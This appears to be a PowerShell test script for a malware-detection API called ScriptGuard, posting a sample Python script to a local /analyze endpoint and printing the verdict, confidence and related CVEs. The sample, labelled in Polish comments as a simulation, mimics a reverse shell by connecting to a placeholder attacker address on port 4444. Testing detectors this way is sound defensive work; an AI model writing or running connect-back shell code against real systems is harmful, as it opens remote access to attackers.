# Test ScriptGuard API - Malicious Reverse Shell Script
# PowerShell script to test /analyze endpoint

$scriptContent = @'
import socket
import subprocess
import os

def reverse_shell():
    # USUNIĘTO: Rzeczywisty adres IP i port atakującego
    # Przykład zachowania: próba połączenia z zewnętrznym serwerem
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # TYLKO SYMULACJA - poniższy adres jest nieprawdziwy
        s.connect(("192.168.1.100", 4444))

        # Symulacja przesyłania danych
        s.send(b"Test connection - simulated malware behavior")
        s.close()
    except:
        pass

if __name__ == "__main__":
    reverse_shell()
'@

$body = @{
    script_content = $scriptContent
    include_rag = $true
} | ConvertTo-Json

$headers = @{
    "Content-Type" = "application/json"
}

# Jeśli masz ustawiony API key w zmiennej środowiskowej
$apiKey = $env:SCRIPTGUARD_API_KEY
if ($apiKey) {
    $headers["X-API-Key"] = $apiKey
}

Write-Host "Sending request to ScriptGuard API..." -ForegroundColor Cyan
Write-Host "Endpoint: http://127.0.0.1:8000/analyze" -ForegroundColor Gray
Write-Host ""

try {
    $response = Invoke-RestMethod -Uri "http://127.0.0.1:8000/analyze" -Method Post -Body $body -Headers $headers -TimeoutSec 30

    Write-Host "✅ Analysis Complete!" -ForegroundColor Green
    Write-Host ""
    Write-Host "Results:" -ForegroundColor Yellow
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
    Write-Host "Is Malicious: " -NoNewline -ForegroundColor White
    if ($response.is_malicious) {
        Write-Host "YES" -ForegroundColor Red
    } else {
        Write-Host "NO" -ForegroundColor Green
    }
    Write-Host "Confidence:   $($response.confidence)" -ForegroundColor White
    Write-Host ""
    Write-Host "Reasoning:" -ForegroundColor Cyan
    Write-Host $response.reasoning -ForegroundColor Gray

    if ($response.related_cves -and $response.related_cves.Count -gt 0) {
        Write-Host ""
        Write-Host "Related CVEs:" -ForegroundColor Cyan
        foreach ($cve in $response.related_cves) {
            Write-Host "  - $($cve.id) (Score: $($cve.score))" -ForegroundColor Gray
            Write-Host "    $($cve.description)" -ForegroundColor DarkGray
        }
    }

} catch {
    Write-Host "❌ Request Failed!" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    if ($_.Exception.Response) {
        $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
        $responseBody = $reader.ReadToEnd()
        Write-Host "Response:" -ForegroundColor Yellow
        Write-Host $responseBody -ForegroundColor Gray
    }
}

